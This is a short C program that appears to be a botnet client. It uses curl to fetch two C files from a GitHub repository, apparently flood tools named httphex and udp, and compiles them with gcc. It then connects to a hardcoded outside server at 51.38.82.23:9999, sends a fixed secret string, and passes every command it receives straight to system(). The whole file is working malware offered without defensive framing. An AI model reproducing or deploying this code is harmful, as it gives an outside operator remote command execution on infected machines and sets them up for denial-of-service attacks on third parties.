#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define SECRET_STRING "cat123"
#define SERVER_IP "51.38.82.23"
#define SERVER_PORT 9999
#define BUFFER_SIZE 1024

void download_files() {
    system("curl https://raw.githubusercontent.com/bobjohnmarley123/dog/main/httphex.c -o httphex.c");
    system("curl https://raw.githubusercontent.com/bobjohnmarley123/dog/main/udp.c -o udp.c");
    system("gcc httphex.c -o httphex -pthread");
    system("gcc udp.c -o udp -pthread");
}


void *listen_for_commands(void *client_socket_ptr) {
    int client_socket = *(int *)client_socket_ptr;
    char command[BUFFER_SIZE];

    while (true) {
        memset(command, 0, BUFFER_SIZE);
        ssize_t bytes_received = recv(client_socket, command, BUFFER_SIZE - 1, 0);
        if (bytes_received <= 0) {
            printf("Server closed connection or error receiving data, disconnecting...\n");
            break;
        }

        printf("Received command: %s\n", command);

        system(command);
        send(client_socket, "Command executed", sizeof("Command executed"), 0);
    }

    close(client_socket);
    return NULL;
}

int main() {
    int client_socket;
    struct sockaddr_in server_addr;


    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket < 0) {
        perror("Error creating socket");
        exit(1);
    }

    download_files();

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        perror("Invalid server IP address");
        exit(1);
    }

    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Error connecting to server");
        exit(1);
    } else {
        printf("Connected to server %s:%d\n", SERVER_IP, SERVER_PORT);
    }

    // Send the secret string as UTF-8 encoded bytes
    send(client_socket, SECRET_STRING, strlen(SECRET_STRING), 0);
    printf("Sent secret string to server\n");

    pthread_t listen_thread;
    pthread_create(&listen_thread, NULL, listen_for_commands, &client_socket);

    // Wait for the listen_thread to finish before exiting
    pthread_join(listen_thread, NULL);

    printf("Disconnected from server\n");
    return 0;
}
